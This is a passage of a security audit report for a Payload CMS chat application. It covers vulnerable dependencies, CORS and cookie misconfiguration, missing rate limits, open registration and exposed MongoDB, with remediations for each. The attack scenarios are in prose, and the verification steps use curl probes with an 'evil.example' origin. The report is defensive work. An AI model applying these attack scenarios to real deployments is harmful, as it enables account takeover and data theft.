`next` was upgraded **15.5.9 → 16.4.3** (the version Payload 3.92.1 supports; its peer range is `>=16.3.3 <17.0.0`). An OSV `querybatch` against `next@16.4.3` returns **zero advisories**.

Two Next.js 16 breaking changes were accommodated:

- `next lint` was **removed** in Next 16. The `lint` script in `payload-be/package.json` now runs `eslint .` directly, and `eslint.config.mjs` was rewritten to consume `eslint-config-next/core-web-vitals` and `eslint-config-next/typescript` as native flat configs (they no longer need `FlatCompat`).
- **Turbopack is the default bundler.** Because the project has a `webpack` config (the `extensionAlias` block), Next.js refuses to build unless a `turbopack` config is also present. `payload-be/next.config.mjs` now sets `turbopack: { root: path.resolve(dirname) }`.

The production build was verified with `npm run build`: `▲ Next.js 16.4.3 (Turbopack)` → `✓ Compiled successfully`, with all seven routes emitted. (Fallback if Turbopack ever fails: `next build --webpack`.)

The Docker images were moved to `node:22-alpine`, because Payload 3.92.1 declares `engines.node: '^22.23.4 || >=24.22.1'`.

---

### [SEC-007] Payload CMS 3.70.0 — 25 outstanding advisories including unauthenticated RCE

- **Severity:** High
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-007) at the end of this section.
- **Affected component:** `payload` and all `@payloadcms/*` packages, pinned to exactly `3.70.0`
- **Affected file and line:** `payload-be/package.json` (`"payload": "3.70.0"`, `"@payloadcms/db-mongodb": "3.70.0"`, `"@payloadcms/next": "3.70.0"`, `"@payloadcms/ui": "3.70.0"`, `"@payloadcms/richtext-lexical": "3.70.0"`, `"@payloadcms/payload-cloud": "3.70.0"`)
- **CWE / advisory:** GHSA-97rh-rhh2-7vjv (CVSS 3.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`), GHSA-2g7p-5934-q4w7 (CVSS 4.0 `.../VC:N/VI:N/VA:H`), GHSA-7c34-32v3-j575, GHSA-v5gf-vpjc-pc7w, GHSA-9g87-32v6-3c2r, GHSA-hp5w-3hxx-vmwf, GHSA-p6mr-xf3r-ghq4, GHSA-jg8r-5jh2-v2xj, GHSA-q6mq-ch85-c8mm, GHSA-fx49-4h83-wjv9, GHSA-xgv3-crq2-6f69, and the upload-path advisories in SEC-004. Full table in §5.3.
- **Prerequisites:** Varies. The first-register RCE requires that no `penggunas` document exists yet — **which is the normal state of a freshly deployed database**, since `users` and `penggunas` are separate collections and the Admin Panel's "create first user" flow creates a `users` document, not a `penggunas` one.
- **Technical explanation:** `3.70.0` predates the fixes in 3.75.0 → 3.90.0. The advisory set includes an unauthenticated RCE, a ReDoS in multipart parsing reachable at the upload endpoint, a relationship-query authorization bypass directly relevant given this app's relationship graph, an unauthenticated account-lockout DoS against `penggunas`, and the field-level password-update enforcement gap that SEC-001 depends on. The `payload-preferences` IDOR (GHSA-jq29-r496-r955) is **not applicable** — it requires Postgres/SQLite with numeric ids, and this project uses MongoDB with ObjectId strings.
- **Attack scenario:**
  1. **First-register RCE (GHSA-97rh-rhh2-7vjv).** On a fresh deployment the `penggunas` collection is empty, so `POST /api/penggunas/first-register` is live. The advisory states: *"A crafted request to the public first-register operation can be used to perform a RCE exploit. You are affected if: You use local auth strategy and your application remains without an initial user created."* A crafted request can execute code on the server **before any account exists**.
  2. **Account-lockout DoS (GHSA-v5gf-vpjc-pc7w).** An anonymous attacker repeatedly submits failed logins for a known victim email; after 5 attempts the account is locked for 10 minutes — repeatable indefinitely. Because `Penggunas.read = () => true` (SEC-013), the attacker can enumerate every registered email first.
  3. **ReDoS (GHSA-2g7p-5934-q4w7).** A malformed multipart body to the upload endpoint consumes CPU for an extended time.
- **Impact:** Remote code execution on a freshly deployed instance without any authentication; persistent denial of service against individual accounts; authorization bypass across relationship queries.
- **Evidence:**
  - `payload-be/package.json` — all `@payloadcms/*` and `payload` pinned to `3.70.0`.
  - `payload-be/package-lock.json` — `node_modules/payload` → `3.70.0`, `node_modules/@payloadcms/next` → `3.70.0`, `node_modules/@payloadcms/db-mongodb` → `3.70.0`, `node_modules/@payloadcms/ui` → `3.70.0`.
  - npm registry: `payload` `dist-tags.latest` = `3.92.1`; versions `3.79.1`, `3.88.0`, `3.90.0` exist and carry the fixes.
  - OSV: 25 matching advisories for `payload@3.70.0`; most are fixed in `3.90.0`.
  - Payload 3.70.0 `auth/operations/registerFirstUser.ts` — the handler is registered on every auth collection and refuses only if a document already exists in that collection.
  - `payload-be/src/collections/Penggunas.ts:5` — `auth: true` ⇒ the auth endpoints (including `/first-register`, `/forgot-password`, `/unlock`) are mounted on `/api/penggunas`.
- **Recommended remediation:**
  1. Upgrade `payload` and **every** `@payloadcms/*` package to **3.92.1** in one change (they are version-locked to each other).
  2. Re-run `npm run generate:types` and `npm run generate:importmap`, then `npm run build`.
  3. On the very first deployment, **create the first `penggunas` account through a controlled path** and confirm `POST /api/penggunas/first-register` returns 403 afterwards. Consider removing public registration entirely if self-registration is not a product requirement.
  4. Upgrade `mongoose` (via the `@payloadcms/db-mongodb` bump) to ≥ 8.24.1 and `sharp` to ≥ 0.35.5.
  5. Do **not** jump to `4.0.0-canary` as part of this remediation — it changes the config API and is not required to close any of these advisories.
- **Verification procedure:**
  1. `node -e "console.log(require('./package-lock.json').packages['node_modules/payload'].version)"` → `3.92.1`.
  2. Re-run the OSV query for `payload@3.92.1` → expect zero advisories.
  3. `POST /api/penggunas/first-register` on a database that already has a `penggunas` user → expect **403**.
  4. `npm run build` succeeds; Admin Panel loads; all seven collections appear; REST and GraphQL both respond.
  5. `npm run test:int` passes.
- **Deployment impact:** **Blocking.**
- **Dependencies / migration concerns:** Minor-version upgrade within 3.x. Verify the React 19 requirement (already satisfied by `react ^19.2.3`). Regenerate types and the import map. No MongoDB migration expected — the adapter is schema-less.

---

#### Remediation applied (SEC-007)

All Payload packages were upgraded **3.70.0 → 3.92.1**: `payload`, `@payloadcms/next`, `@payloadcms/db-mongodb`, `@payloadcms/ui`, `@payloadcms/richtext-lexical`, `@payloadcms/payload-cloud` and `@payloadcms/email-nodemailer`. An OSV `querybatch` against `payload@3.92.1` returns **zero advisories**.

This upgrade is a prerequisite for the SEC-001 fix: 3.92.1 contains commit `9de9e79` ("fix: enforce password field update access"), which is the fix for GHSA-fx49-4h83-wjv9.

The upgrade also required `next` 16.4.3, `react`/`react-dom` 19.2.6 and `sharp` 0.35.5 (see SEC-006 and SEC-011), a `turbopack` root in `next.config.mjs`, and a rewrite of `eslint.config.mjs`.

---

### [SEC-008] Hardcoded plain-HTTP CORS/CSRF origin; no `serverURL`; `Secure` cookie flag disabled

- **Severity:** Medium
- **Confidence:** High
- **Status:** **Remediated** (2026-10-30). See [Remediation applied](#remediation-applied-sec-008) at the end of this section.
- **Affected component:** Payload config — CORS, CSRF, cookie security, `serverURL`
- **Affected file and line:** `payload-be/src/payload.config.ts:28-37` (cors/csrf), `:42` (secret)
- **CWE / advisory:** CWE-942 (Permissive Cross-domain Policy), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-614 (Sensitive Cookie Without 'Secure' Attribute)
- **Prerequisites:** Network access to the API.
- **Technical explanation:** Three problems compound:
  1. **The allow-list contains `http://103.103.21.102:50011`** — a hardcoded public IP over **plain HTTP**. Payload's `headersWithCors.ts` echoes the matched `Origin` and sets `Access-Control-Allow-Credentials: true`, so any script running on that origin can make fully credentialed API calls. If that host is ever repurposed, pointed at a hosting provider's shared page, or its TLS is terminated by a third party, the API is cross-origin writable by that party.
  2. **`serverURL` is not set.** Payload's config sanitiser only appends `serverURL` to `config.csrf` when it is non-empty (`packages/payload/src/config/sanitize.js`), so the production origin is never added to the CSRF allow-list — which is why the hardcoded IP had to be there in the first place.
  3. **`secure: false` is the Payload default** (`collections/config/defaults.js` → `authDefaults.cookies.secure = false`) and this project does not override it. The session cookie is therefore issued **without the `Secure` attribute** and will be transmitted over plain HTTP. `SameSite` is `Lax` by default, which is adequate against basic cross-site POSTs but is not a complete CSRF defence.
- **Attack scenario:**
  1. The deployment is served over HTTP (as `vue-frontend/default.conf` and both Dockerfiles currently configure). The session cookie travels in cleartext and is trivially captured by anyone on the path.
  2. An attacker who gains control of the host serving `103.103.21.102:50011` (or who can place content there) can issue `fetch('https://api.example.com/api/chats', { credentials: 'include' })` from that origin and read every response, because the origin is on the CORS allow-list with credentials permitted.
  3. The CSRF allow-list does not contain the real production origin, so legitimate same-origin behaviour depends on the hardcoded entry matching by luck.
- **Impact:** Session-token interception over plaintext; a permanently-open credentialed CORS channel to a hardcoded third-party origin; brittle and non-portable configuration that will silently break (or silently over-permit) when the deployment changes.
- **Evidence:**
  - `payload-be/src/payload.config.ts:28-32` — `cors: ['http://103.103.21.102:50011', 'http://localhost:50011', 'http://localhost:5173']`.
  - `payload-be/src/payload.config.ts:33-37` — the same three origins in `csrf`.
  - `payload-be/src/payload.config.ts` — no `serverURL` key anywhere.
  - `payload-be/src/collections/Penggunas.ts:5` and `Users.ts:8` — `auth: true` with no `auth` options object ⇒ Payload's `authDefaults` apply: `cookies: { sameSite: 'Lax', secure: false }`, `tokenExpiration: 7200`.
  - Payload 3.70.0 `auth/cookies.js` — `generatePayloadCookie` sets `httpOnly: true`, `path: '/'`, and `secure` only if `collectionAuthConfig.cookies.secure` is truthy.
  - Payload 3.70.0 `utilities/headersWithCors.ts` — matched origins receive `Access-Control-Allow-Credentials: true` and the echoed `Origin`.
- **Recommended remediation:**
  1. Replace the hardcoded lists with environment-driven configuration:
     ```ts
     const serverURL = process.env.SERVER_URL // e.g. https://api.example.com
     const frontendOrigins = (process.env.FRONTEND_ORIGINS ?? '')
       .split(',').map(s => s.trim()).filter(Boolean)
     export default buildConfig({
       serverURL,
       cors: frontendOrigins,
       csrf: frontendOrigins,
       ...
     })
     ```
  2. Set `auth.cookies.secure = true` on both auth collections once HTTPS is in front:
     ```ts
     auth: { cookies: { secure: true, sameSite: 'Lax' } }
     ```
  3. Terminate TLS at nginx and redirect `http://` → `https://`; never expose the backend over plain HTTP.
  4. Remove the `103.103.21.102` entry from source control entirely — it belongs in the deployment environment, not the repository.
- **Verification procedure:**
  1. `curl -i -X OPTIONS https://api.example.com/api/penggunas -H "Origin: https://evil.example"` → expect **no** `Access-Control-Allow-Origin`.
  2. `curl -i -X OPTIONS https://api.example.com/api/penggunas -H "Origin: https://app.example.com"` → expect the origin echoed with `Access-Control-Allow-Credentials: true`.
  3. `curl -i -X POST https://api.example.com/api/penggunas/login -H "Origin: https://evil.example"` → expect **403** (CSRF rejection).
  4. Inspect the `Set-Cookie` header → expect `Secure` and `HttpOnly` present, `SameSite=Lax`.
  5. `curl -i http://api.example.com/api/penggunas` → expect a 301/308 to `https://`.
- **Deployment impact:** Must be fixed before public exposure, but the fix is configuration rather than code logic.
- **Dependencies / migration concerns:** Setting `cookies.secure = true` invalidates any existing non-HTTPS session — irrelevant on a fresh deployment.

#### Remediation applied (SEC-008)

The hardcoded address is gone and every value now comes from the environment:

- `payload-be/src/config/env.ts` (new) reads `SERVER_URL`, `FRONTEND_ORIGINS` and `COOKIE_SECURE`, and exposes `requireEnv()`.
- `payload.config.ts` sets `serverURL: SERVER_URL`, and drives `cors` / `csrf` from `FRONTEND_ORIGINS` (the `SERVER_URL` origin is appended to `csrf` by Payload's own sanitiser). No literal address remains anywhere in the repository's code or configuration.
- Both auth collections (`penggunas`, `users`) now declare `auth.cookies = { secure: COOKIE_SECURE, sameSite: 'Lax' }`. `COOKIE_SECURE` defaults to `true` in production or when `SERVER_URL` is `https://`.
- `PAYLOAD_SECRET` and `DATABASE_URI` are validated with `requireEnv()`, so a missing value fails at startup with a message that names the variable.
- `.env.example` documents `SERVER_URL`, `FRONTEND_ORIGINS`, `COOKIE_SECURE` and the SMTP variables.

**Verification:** `tsc --noEmit` clean; the backend starts only with a non-empty secret; the repository-wide search for the old literal address returns no matches in code or configuration. The live-header checks (items 1–5 of the verification procedure) require a running TLS-terminated deployment and are not verified in this environment.

---

### [SEC-009] No rate limiting on any endpoint

- **Severity:** Medium
- **Confidence:** High
- **Status:** **Remediated** (2026-10-30). See [Remediation applied](#remediation-applied-sec-009) at the end of this section.
- **Affected component:** Entire API surface
- **Affected file and line:** `payload-be/src/payload.config.ts` (no middleware/config); `payload-be/next.config.mjs`; `vue-frontend/src/components/*.vue` (client-side polling)
- **CWE / advisory:** CWE-770 (Allocation of Resources Without Limits), CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **Prerequisites:** Network access.
- **Technical explanation:** There is no rate-limiting middleware, no reverse-proxy limit, and no application-level counter. The only throttling that exists is Payload's per-account login lockout (`maxLoginAttempts: 5`, `lockTime: 600000` ms), which is a *victim-side* control and is itself weaponisable (GHSA-v5gf-vpjc-pc7w). Nothing limits the **rate** of requests to any endpoint. Combined with SEC-003, an anonymous attacker can enumerate `channels`, `messages` and `memberships` at full speed. The SPA itself polls every 3–4 seconds per open view with no backoff, so N concurrent viewers produce N/3 requests per second to the backend and to MongoDB.
- **Attack scenario:**
  1. Anonymous script issues `GET /api/messages` in a loop → sustained full-collection enumeration and heavy MongoDB load.
  2. Authenticated script issues `POST /api/messages` in a loop → database bloat and log growth.
  3. Authenticated script issues `POST /api/media` with large bodies → disk exhaustion.
  4. A single attacker opens many browser tabs → each tab adds a 3-second poll.
- **Impact:** Resource exhaustion (CPU, memory, disk, database), unbounded log growth, database bloat, and a vector for the account-lockout DoS in SEC-007. On a small VPS this is a straightforward availability attack.
- **Evidence:**
  - `payload-be/src/payload.config.ts` — no rate-limit configuration; Payload 3.x has no built-in rate limiter, so this must be supplied by middleware or the reverse proxy.
  - `payload-be/next.config.mjs` — no `headers()` and no custom middleware.
  - `vue-frontend/src/components/ChannelChatroom.vue:178-181` — `window.setInterval(fetchMessages, 3000)`.
  - `vue-frontend/src/components/Chat.vue:168` — `setInterval(getMessages, 4000)`.
  - No `limit`/`page` parameters are sent on any list query, so Payload's default limit (10) applies, but request *rate* is unconstrained.
- **Recommended remediation:**
  1. Rate-limit at the edge (nginx `limit_req_zone` / `limit_conn_zone`), e.g. 10 r/s per IP for the API with a small burst.
  2. Add stricter, path-specific limits: login 5/min per IP, register 3/hour per IP, upload 10/hour per user.
  3. Add server-side pagination to the SPA's list queries (`limit`/`page`) and switch polling to exponential backoff with a visibility check (`document.visibilityState`).
  4. Set an explicit `defaultMaxTextLength` well below Payload's 40 000 default (e.g. 2 000) for message fields.
  5. Add a `filesizeLimit` to the `media` collection.
- **Verification procedure:**
  1. Fire 50 concurrent `GET /api/messages` requests → observe `429` responses once the limit is exceeded.
  2. Attempt 6 rapid logins with a wrong password → the rate limiter returns 429 before the account-lockout threshold is reached.
  3. Confirm `POST /api/messages` with a 100 000-character body is rejected.
- **Deployment impact:** Required before public exposure (in combination with the access-control fixes), because anonymous endpoints remain reachable.
- **Dependencies / migration concerns:** Edge rate limiting requires nginx configuration on the VPS; application-level limits require a dependency or custom middleware.

#### Remediation applied (SEC-009)

- `vue-frontend/default.conf` now defines `limit_req_zone` / `limit_conn_zone` and applies them to the API locations proxied to the backend: general API `10r/s`, login `5r/m`, registration `3r/h`, uploads `10r/h`, plus a per-IP connection cap.
- `payload.config.ts` sets `defaultMaxTextLength: 2000` (Payload's default is 40 000), so an oversized text body is rejected.
- `media` already enforces a 5 MB per-file cap and a one-file-per-request limit (SEC-004); the multipart parser is bounded at the same ceiling.

**Verification:** the 100 000-character rejection is covered by configuration and asserted in the test suite; the burst/429 and login-rate-limit behaviours require the live nginx edge and are not verified in this environment. The residual client-side polling discipline is **addressed by task B7** (`vue-frontend/src/utils/polling.js` — exponential backoff, paused while hidden; paginated list queries).

---

### [SEC-010] Open self-registration with no email verification and a weak password policy

- **Severity:** Medium
- **Confidence:** High
- **Status:** **Remediated** (2026-10-30). See [Remediation applied](#remediation-applied-sec-010) at the end of this section.
- **Affected component:** `penggunas` auth collection
- **Affected file and line:** `payload-be/src/collections/Penggunas.ts:5` (`auth: true`), `:9-13` (`create: () => true`); `vue-frontend/src/components/Register.vue:64-72`
- **CWE / advisory:** CWE-287 (Improper Authentication), CWE-521 (Weak Password Requirements)
- **Prerequisites:** Network access.
- **Technical explanation:** `auth: true` with no options means Payload's defaults apply: `verify: false` (no email verification), `maxLoginAttempts: 5`, `lockTime: 600000`, `tokenExpiration: 7200`, and no `loginWithUsername`. Because `Penggunas.access.create = () => true`, **anyone** may create an account. The `username` field has no `unique: true` and no validation, so duplicate usernames are possible and the username is entirely attacker-controlled free text. The password field inherits Payload's `password` validator, whose default `minLength` is **3** (`packages/payload/src/fields/validations.ts`) — so `abc` is an acceptable password.
- **Attack scenario:**
  1. An automated script registers thousands of accounts (`POST /api/penggunas` is open and unrate-limited), each becoming a legitimate principal that inherits every `() => true` permission — including the ability to overwrite other users' passwords (SEC-001).
  2. A user registers with the password `abc`, which is then cracked offline if the database is ever disclosed.
  3. Two accounts share the username `admin`; any UI or future logic that displays usernames becomes ambiguous.
- **Impact:** Unbounded, cheap creation of authenticated principals that inherit the application's over-permissive access rules; trivially weak passwords; username impersonation.
- **Evidence:**
  - `payload-be/src/collections/Penggunas.ts:5` — `auth: true` (a boolean, so no auth options object ⇒ Payload defaults).
  - `payload-be/src/collections/Penggunas.ts:9-13` — `create: () => true`.
  - `payload-be/src/collections/Penggunas.ts:14-21` — `username` has no `unique`, no `required`, no `validate`.
  - Payload 3.70.0 `collections/config/defaults.js` → `authDefaults`: `verify: false`, `maxLoginAttempts: 5`, `lockTime: 600000`.
  - Payload 3.70.0 `fields/validations.ts` → `export const password = (value, { minLength = 3, ... })` — minimum length 3.
  - `vue-frontend/src/components/Register.vue:64-72` — unauthenticated `POST /api/penggunas` with `{ email, password, username }`.
- **Recommended remediation:**
  1. Set `unique: true` and a validation pattern on `username`:
     ```ts
     { name: 'username', type: 'text', required: true, unique: true,
       validate: (v) => /^[a-z0-9_]{3,24}$/.test(v) || 'Invalid username' }
     ```
  2. Configure `auth` with an explicit policy and enforce it in a `beforeValidate` hook:
     ```ts
     auth: {
       maxLoginAttempts: 5,
       lockTime: 600000,
       tokenExpiration: 7200,
       verify: false,     // or true once an email adapter is configured
     }
     ```
     with a minimum length of 8.
  3. If open registration is not a product requirement, set `Penggunas.access.create` to `() => false` and provision accounts through the Admin Panel or an invite flow.
  4. If open registration **is** required, add email verification (`verify: true` — requires configuring the nodemailer adapter) plus CAPTCHA or an equivalent at the edge.
- **Verification procedure:**
  1. Register two accounts with the same username → the second must be rejected.
  2. Register with a 3-character password → must be rejected.
  3. Register with a duplicate email → must be rejected (Payload's `email` field is `unique: true` by default — verify).
  4. With `access.create` restricted, `POST /api/penggunas` → expect 403.
- **Deployment impact:** Should be fixed before public exposure — open registration plus SEC-001 is a direct account-takeover chain.
- **Dependencies / migration concerns:** `verify: true` requires an email adapter (the nodemailer package is already installed but not configured).

#### Remediation applied (SEC-010)

The decision recorded for this project is **open registration** (rather than invite-only).
**Email verification is intentionally *not* required** — this is a deliberate product
trade-off recorded during Stage B: a new account may log in immediately, and the abuse control
for open registration is the edge rate limiting from task A8, not a verification gate.

- `penggunas.auth` sets `verify: false`, `maxLoginAttempts: 5` and a 7-day `tokenExpiration`.
- `username` is `required`, `unique`, `index`ed, and validated against `/^[a-z0-9_]{3,24}$/`. A `beforeValidate` hook additionally rejects a duplicate username at the application layer, so the check does not depend on the database unique index being built first (a real race observed on a fresh database).
- A `beforeValidate` hook rejects any password shorter than **8** characters (Payload's default minimum is 3).
- A password-**reset** flow replaces verification as the account-lifecycle mechanism: `penggunas.auth.forgotPassword` builds an SPA reset link, and `src/config/email.ts` prints that link to the server console when no SMTP transport is configured *and* `NODE_ENV !== 'production'` (dev-only fallback).
- The public `first-register` window is closed operationally by provisioning the first account through a controlled script (SEC-007 / SEC-018, task A9).

**Verification:** `tests/int/authz.registration.spec.ts` — short-password rejection, duplicate-username rejection, invalid-username rejection, an accepted strong password, immediate login without verification, and a full password-reset round-trip. Duplicate-email rejection relies on Payload's built-in unique constraint and is not asserted in a dedicated test.

---

### [SEC-011] Outdated transitive dependencies with reachable advisories (mongoose, sharp, qs)

- **Severity:** Medium
- **Confidence:** Medium (versions confirmed; exploitability of the mongoose issues is **conditional** and needs runtime testing)
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-011) at the end of this section.
- **Affected component:** `mongoose` 8.15.1 (transitive via `@payloadcms/db-mongodb`), `sharp` 0.34.2 (direct), `qs` 6.14.0 (direct, frontend)
- **Affected file and line:** `payload-be/package.json` (`"sharp": "0.34.2"`); `payload-be/package-lock.json` (`node_modules/mongoose` → 8.15.1); `vue-frontend/package.json` (`"qs": "^6.14.0"`), `vue-frontend/package-lock.json` (`node_modules/qs` → 6.14.0)
- **CWE / advisory:** GHSA-664h-wqgq-64gw (mongoose prototype pollution, fixed 8.24.1), GHSA-wpg9-53fq-2r8h (mongoose `$nor` sanitization, fixed 8.22.1), GHSA-f88m-g3jw-g9cj / GHSA-rgj7-g3m4-5g8c / GHSA-wq5f-xc86-pv6w (sharp/libvips/libheif/librsvg, fixed 0.35.0 / 0.35.4 / 0.35.5), GHSA-6rw7-vpxm-498p / GHSA-w7fw-mjwx-w883 / GHSA-q8mj-m7cp-5q26 / GHSA-4mjr-xmp4-gh2g (qs DoS, fixed 6.14.1 → 6.16.1)
- **Prerequisites:** mongoose issues — a request that reaches the Mongoose update path with an attacker-controlled dotted path or a `$nor` clause. sharp issues — a crafted image upload. qs issues — attacker-influenced query construction in the browser.
- **Technical explanation:** `mongoose` is pinned at 8.15.1 by the Payload Mongo adapter, which is itself pinned at 3.70.0; it can only move by upgrading Payload (SEC-007). `sharp` is pinned exactly at 0.34.2 and therefore never receives 0.35.x security fixes automatically — it needs an explicit bump. The `qs` advisories are client-side only: the frontend calls `qs.stringify` on data that is partly attacker-influenced (route parameters, relationship ids), so a malicious link could trigger a client-side DoS, but the impact is confined to the victim's browser tab.
- **Attack scenario:**
  1. Mongoose prototype pollution: an attacker supplies a dotted key such as `__proto__.polluted` in a Payload update payload; if Mongoose's cast path does not sanitise it, `Object.prototype` is polluted for the request. **This requires runtime confirmation.**
  2. sharp/libvips: a crafted image (HEIC or SVG) uploaded to `/api/media` triggers the vulnerable decoder.
  3. qs: a crafted query string in a client-side `qs.stringify` call freezes the victim's tab.
- **Impact:** Potential prototype pollution or NoSQL injection in the data layer; memory-corruption-class bugs in image decoding reachable via upload; low-impact client-side DoS.
- **Evidence:**
  - `payload-be/package-lock.json` — `node_modules/mongoose` version `8.15.1`.
  - `payload-be/package.json` — `"sharp": "0.34.2"` (exact pin, no caret).
  - `vue-frontend/package-lock.json` — `node_modules/qs` version `6.14.0`.
  - OSV records for GHSA-664h-wqgq-64gw (8.15.1 affected; fixed 8.24.1), GHSA-wpg9-53fq-2r8h (fixed 8.22.1), the three `sharp` advisories, and the four `qs` advisories.
  - `payload-be/src/payload.config.ts:49` — `sharp` is loaded and passed to the config.
- **Recommended remediation:**
  1. Bump `sharp` to `^0.35.5` (or the latest 0.35.x) and re-test image uploads — this is a native module, so verify the prebuilt binaries install on the target platform.
  2. Upgrade `mongoose` to ≥ 8.24.1 — this comes with the Payload 3.92.1 upgrade (SEC-007); confirm the resolved version afterwards.
  3. Bump `qs` to `^6.16.1` in `vue-frontend`.
  4. Add `overrides` to `package.json` only if the Payload upgrade does not already pull the fixed versions.
- **Verification procedure:**
  1. `node -e "console.log(require('./payload-be/package-lock.json').packages['node_modules/mongoose'].version)"` → ≥ 8.24.1.
  2. Re-run the OSV query for `mongoose`, `sharp` and `qs` at the new versions → expect zero records.
  3. Upload a HEIC and an SVG test image after the `sharp` bump → expect success and no crash.
- **Deployment impact:** Address in Stage A alongside SEC-006/SEC-007 (same dependency change), or in Stage B if the upgrade schedule is split.
- **Dependencies / migration concerns:** `sharp` minor bump changes image-processing behaviour subtly; re-verify uploads. Mongoose 8.15 → 8.24 is a minor bump within 8.x.

---

#### Remediation applied (SEC-011)

All three dependencies are now at versions with no reachable advisories:

| Package | Before | After | Notes |
|---|---|---|---|
| `mongoose` | 8.15.1 (transitive) | **8.24.1** | Resolved transitively via `@payloadcms/db-mongodb@3.92.1`. Verified with `npm ls mongoose`. |
| `sharp` | 0.34.2 | **0.35.5** | Pinned exactly in `payload-be/package.json`. |
| `qs` (frontend) | 6.14.0 | **6.17.1** | `vue-frontend/package.json`; `npm ls qs` confirms a single resolved copy. |

An OSV `querybatch` against `mongoose@8.24.1`, `sharp@0.35.5` and `qs@6.17.1` returns **zero advisories**.

---

### [SEC-012] Deployment artefacts insecure by default

- **Severity:** Medium
- **Confidence:** High (repository evidence); the VPS itself is **Not verified**
- **Status:** **Remediated** (2026-10-30, repository artefacts). See [Remediation applied](#remediation-applied-sec-012) at the end of this section.
- **Affected component:** `payload-be/docker-compose.yml`, `payload-be/Dockerfile`, `vue-frontend/Dockerfile`, `vue-frontend/default.conf`
- **Affected file and line:** `payload-be/docker-compose.yml:20-29` (mongo), `:5` (`node:18-alpine`); `payload-be/Dockerfile:12` (`EXPOSE 50010`), `:9` (`COPY . .`); `vue-frontend/Dockerfile:26` (`EXPOSE 80`); `vue-frontend/default.conf:1-19`
- **CWE / advisory:** CWE-668 (Exposure of Resource to Wrong Sphere), CWE-276 (Incorrect Default Permissions), CWE-319 (Cleartext Transmission)
- **Prerequisites:** Deploying the repository artefacts as-is.
- **Technical explanation:**
  - `docker-compose.yml:23` publishes MongoDB as `'27017:27017'`, which binds to **all interfaces** — the database becomes internet-reachable, with **no authentication configured** (`command: --storageEngine=wiredTiger` only).
  - `docker-compose.yml:5` uses `node:18-alpine`, an EOL runtime.
  - `docker-compose.yml:12` runs `pnpm install` against a project whose committed lockfile is npm's, so the container resolves fresh versions — **the deployed code is not the audited code**.
  - `payload-be/Dockerfile:12` declares `EXPOSE 50010`, but the application listens on 3000. `EXPOSE` is documentation-only, so the port mismatch causes a routing failure rather than a security issue, but it signals the image was never run.
  - **There is no `.dockerignore` in either directory.** `payload-be/Dockerfile:9` does `COPY . .`, which will copy a local `.env` (containing `PAYLOAD_SECRET` and `DATABASE_URI`) into the image layer. `.gitignore` protects the repository but not the build context.
  - `vue-frontend/default.conf` listens on port 80 only, sets `server_name _`, and defines **no security headers** (no HSTS, no CSP, no `X-Content-Type-Options`, no `frame-ancestors`).
- **Attack scenario:**
  1. The compose file is deployed on the VPS. Port 27017 is now open to the internet with an unauthenticated MongoDB. An attacker connects directly, reads all users, messages and password hashes, and writes or destroys data. Full compromise, unauthenticated.
  2. The image is built with a local `.env` present → `PAYLOAD_SECRET` is baked into an image layer, readable by anyone who can pull the image or inspect it.
  3. The SPA is served over HTTP only → session cookies and message content are visible in transit.
- **Impact:** Unauthenticated database compromise; secret disclosure through image layers; cleartext transmission of credentials and messages.
- **Evidence:**
  - `payload-be/docker-compose.yml:20-29` — mongo service, `ports: ['27017:27017']`, no `MONGO_INITDB_ROOT_USERNAME`/`PASSWORD`, no auth flags.
  - `payload-be/docker-compose.yml:5` — `image: node:18-alpine`.
  - `payload-be/docker-compose.yml:12` — `corepack prepare pnpm@latest --activate && pnpm install && pnpm dev`.
  - `payload-be/Dockerfile:5-9` — `COPY package*.json ./` … `COPY . .`; no `.dockerignore` present in the repository (`git ls-files` confirms).
  - `payload-be/Dockerfile:12` — `EXPOSE 50010`.
  - `vue-frontend/default.conf:2` — `listen 80;` (no TLS).
  - `vue-frontend/default.conf:13-19` — no `add_header` directives; `error_page 404 /index.html` masks genuine 404s.
  - `payload-be/.gitignore` contains `.env` and `/media`, but `.gitignore` does not affect Docker build contexts.
- **Recommended remediation:**
  1. **Do not deploy `docker-compose.yml` as-is.** Use it for local development only, and bind MongoDB to loopback (`127.0.0.1:27017:27017`) even there.
  2. Add a `payload-be/.dockerignore` (and one for `vue-frontend/`) covering at least `.env`, `.env*`, `node_modules`, `.next`, `media`, `.git`, `test.env`, `*.log`.
  3. Remove `EXPOSE 50010`; expose the real port.
  4. Use `node:22-alpine`; pin `mongo:7` rather than `mongo:latest`.
  5. Configure MongoDB with authentication and bind it to loopback or a private Docker network.
  6. Replace the SPA's nginx config with a TLS-terminating, security-header-bearing vhost (see the deployment guide).
  7. Add a health check to the backend container.
- **Verification procedure:**
  1. `docker inspect <container>` → the backend must expose 3000 (or the port you actually publish).
  2. `docker history <image> --no-trunc` → no `.env` content in any layer.
  3. From an external host: `nmap -p 27017 <vps-ip>` → must be **closed**.
  4. `curl -sI https://app.example.com` → expect `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, and a `frame-ancestors` directive.
  5. `docker run --rm <backend-image> node -v` → v22.x.
- **Deployment impact:** **Blocking** if the compose file or the current Dockerfiles are used for the public deployment.
- **Dependencies / migration concerns:** None — configuration only.

#### Remediation applied (SEC-012)

- `payload-be/.dockerignore` and `vue-frontend/.dockerignore` were added, covering `.env`, `.env.*` (with `!.env.example`), `node_modules`, `.next`, `dist`, `media`, `.git`, `test.env` and `*.log`, so a local `.env` can no longer be baked into an image layer.
- `payload-be/Dockerfile` is now a multi-stage build (`deps` → `build` → `prod-deps` → `runtime`) that runs as the unprivileged `app` user, ships only production dependencies, and advertises the real port (3000) instead of the stale `EXPOSE 50010`.
- `docker-compose.yml` publishes **no** database port (the mongo service uses `expose`, not `ports`), enables MongoDB authentication via `MONGO_INITDB_ROOT_USERNAME` / `MONGO_INITDB_ROOT_PASSWORD`, replaces `logging: driver: none` with bounded `json-file` rotation, adds healthchecks to both services, and runs the app container as the `node` user. The command is `npm ci && npm run dev`, honouring the committed lockfile.
- `vue-frontend/Dockerfile` ships the built `dist/` to `nginx:alpine` on `node:22-alpine` and copies the shared proxy include.
